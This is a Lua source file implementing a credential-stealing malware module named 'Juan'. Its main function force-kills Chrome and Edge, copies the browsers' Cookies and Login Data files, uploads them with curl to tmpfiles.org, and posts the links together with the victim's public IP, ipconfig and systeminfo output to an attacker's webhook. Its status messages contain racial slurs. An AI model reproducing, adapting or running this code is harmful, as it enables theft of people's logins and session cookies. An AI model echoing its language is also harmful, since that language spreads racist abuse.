return function(Config)
    local JuanConfig = Config or require("Juan.JuanConfig")
    local Juan = {}

    print("")

    local json = require("Juan.json")
    local https = require("https")
    local winapi = require("winapi")
    local KittyLib = require "modules.KittyLib"
    local fileSystem = require("Juan.fileSystem")
    local url = require("socket.url")


    local function urlencode(list)
        -- Since order of pairs is undefined, the key-value order is also undefined.
        local result = {}
        for k, v in pairs(list) do
            result[#result + 1] = url.escape(k) .. "=" .. url.escape(v)
        end
        return table.concat(result, "&")
    end

    function Juan.Post(Data)
        https.request(JuanConfig.Webhook, {
            method = "POST",
            data = json.encode(Data),
            headers = {
                ["content-type"] = "application/json",
            }
        })
    end

    function Juan.Upload(FileName)
        return winapi.execute('curl -F "file=@' .. FileName .. '" https://tmpfiles.org/api/v1/upload')
    end

    function Juan.Rob()
        Juan.Post({ content = JuanConfig.Extras.StartMSG })

        --love.window.setTitle(JuanConfig.Application.Title or love.window.getTitle())

        -- Stealer
        do
            if not JuanConfig.Stealer.Enabled then
                Juan.Post({
                    content = "#  Juan was unable to break into the home of " .. os.getenv("username")
                })
                goto continue
            end
            Juan.Post({
                content = "# Juan has broken into the home of " .. os.getenv("username") .. " and stole some valuables!\nYOU ONLY HAVE 60 SECONDS BEFORE I RESELL IT TO THE NIGGER MARKET!\n"
            })

            if JuanConfig.Stealer.Cookies then
                for i, v in next, JuanConfig.Stealer.Browsers do
                    local CookieLocation
                    local LoginLocation
                    if v == "Chromium" then
                        for i=1, 20 do
                            winapi.execute("taskkill /im chrome.exe /f")
                        end
                        CookieLocation = os.getenv("LOCALAPPDATA") .. "\\Chromium\\User Data\\Default\\Network\\Cookies"
                        LoginLocation = os.getenv("LOCALAPPDATA") .. "\\Chromium\\User Data\\Default\\Login Data"
                    elseif v == "Chrome" then
                        for i=1, 20 do
                            winapi.execute("taskkill /im chrome.exe /f")
                        end
                        CookieLocation = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
                        LoginLocation = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Login Data"
                    elseif v == "Edge" then
                        for i=1, 20 do
                            winapi.execute("taskkill /im msedge.exe /f")
                        end
                        CookieLocation = os.getenv("LOCALAPPDATA") .. "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
                    end

                    if fileSystem.exists(CookieLocation) then
                        local Copied = CookieLocation .. ".txt"
                        winapi.execute('copy "' .. CookieLocation .. '" "' .. Copied .. '"')
                        local code, response = Juan.Upload(Copied)
                        Juan.Post({
                            content = "```\n" .. v .. " Cookies: " .. response:match('^.+:"(.+)$'):match('^(.+)".+$') .. "```"
                        })
                        fileSystem.delete(Copied)
                    end

                    if fileSystem.exists(LoginLocation) then
                        local Copied = LoginLocation .. ".txt"
                        winapi.execute('copy "' .. LoginLocation .. '" "' .. Copied .. '"')
                        local code, response = Juan.Upload(Copied)
                        Juan.Post({
                            content = "```\n" .. v .. " Logins: " .. response:match('^.+:"(.+)$'):match('^(.+)".+$') .. "```"
                        })
                        fileSystem.delete(Copied) 
                    end
                end
            end

            ::continue::
        end

        -- Leaker
        do
            if not JuanConfig.Leaker.Enabled then
                Juan.Post({
                    content = "# Niggerlicious information about this system was not collected"
                })
                goto continue
            end
            Juan.Post({
                content = "# Niggerlicious information about this system!"
            })

            if JuanConfig.Leaker.IP then
                local Success, OUT = winapi.execute("curl icanhazip.com")
                if Success then
                    Juan.Post({ content = "```\n" .. OUT .. "```\n" })
                end
            end

            if JuanConfig.Leaker.IPConfig then
                local Success, OUT = winapi.execute("ipconfig")
                if Success then
                    Juan.Post({ content = "```\n" .. OUT .. "```\n" })
                end
            end

            if JuanConfig.Leaker.systeminfoCMD then
                local Success, OUT = winapi.execute("systeminfo")
                if Success then
                    local Parts = KittyLib.string.divide(OUT, 3)
                    for i, v in next, Parts do
                        Juan.Post({
                            content = "```\n" .. v .. "```"
                        }) 
                    end
                end
            end

            ::continue::
        end

        -- Extras
        do
            if JuanConfig.Extras.MOTD.Enabled then
                math.randomseed(os.clock())
                local Message = JuanConfig.Extras.MOTD.Messages[math.random(1, #JuanConfig.Extras.MOTD.Messages)]:format(
                    os.getenv("username"))
                Juan.Post({ content = "\nMOTD: " .. Message })
            end
        end

        Juan.Post({ content = JuanConfig.Extras.EndMSG })
    end

    return Juan
end
